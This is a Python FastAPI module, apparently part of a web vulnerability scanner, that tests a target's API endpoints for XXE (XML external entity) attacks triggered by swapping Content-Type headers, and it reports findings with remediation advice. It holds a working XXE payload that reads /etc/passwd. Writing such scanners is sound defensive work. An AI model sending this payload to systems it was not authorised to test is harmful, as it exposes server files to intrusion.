"""xxe_json_xml_conversion — XXE via Content-Type swap (JSON-XML auto-convert).

Some apps accept BOTH application/json and application/xml on the same
endpoint and use a generic deserializer. Attacker POSTs XML body with
Content-Type: application/json → if the server falls through to XML
parser AND DOCTYPE is processed → XXE.
"""
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
from tools._vl_core.turbo import vl_turbo
from tools._vl_core.verify import vl_verify

router = APIRouter()
PROBE_PATHS = ["/api/users", "/api/data", "/api/import",
                "/api/v1/users", "/api/echo"]
XXE_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<foo>&xxe;</foo>'
)


@router.post("/api/webapp/scan/xxe_json_xml_conversion")
@vl_turbo()
@vl_verify()
def scan_xxe_json_xml_conversion(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")
    hits = []
    tested = 0
    for path in PROBE_PATHS:
        url = base + path
        for ct in ("application/json", "application/xml", "text/xml"):
            r = safe_request("POST", url,
                headers={"Content-Type": ct, "User-Agent": "VulnusLab/1.0"},
                data=XXE_PAYLOAD, req=req, timeout=8, allow_redirects=False)
            if r is None: continue
            tested += 1
            body = (r.text or "")[:5000]
            if "root:x:" in body or "root:!" in body:
                hits.append({"path": path, "content_type": ct})
                break
    findings = []
    if hits:
        findings.append(wrap_finding(
            f"XXE via {len(hits)} endpoint(s) — JSON/XML parser confusion",
            "CRITICAL", cvss="9.8", cwe="CWE-611", owasp="A05:2021",
            remediation="Disable DOCTYPE / external entity processing in XML "
                        "parsers. Python: defusedxml. Java: factory."
                        "setFeature('http://apache.org/xml/features/disallow-"
                        "doctype-decl', true). Validate Content-Type matches "
                        "body — don't auto-fall-through.",
            evidence_marker=" | ".join(
                f"{h['path']} (CT={h['content_type']}): /etc/passwd leaked"
                for h in hits[:3]
            )))
    else:
        findings.append(wrap_finding(
            f"No XXE via {tested} probes", "POSITIVE", cwe="CWE-611",
            remediation="Maintain.", evidence_marker=f"{tested} probes clean"))
    return standard_response(
        tool="xxe_json_xml_conversion", target=req.target, findings=findings,
        tests_performed=tested, vulnerable=bool(hits),
        tests_summary=f"{tested} probes, {len(hits)} XXE",
        raw_data={"hits": hits})


def register(app): app.include_router(router)
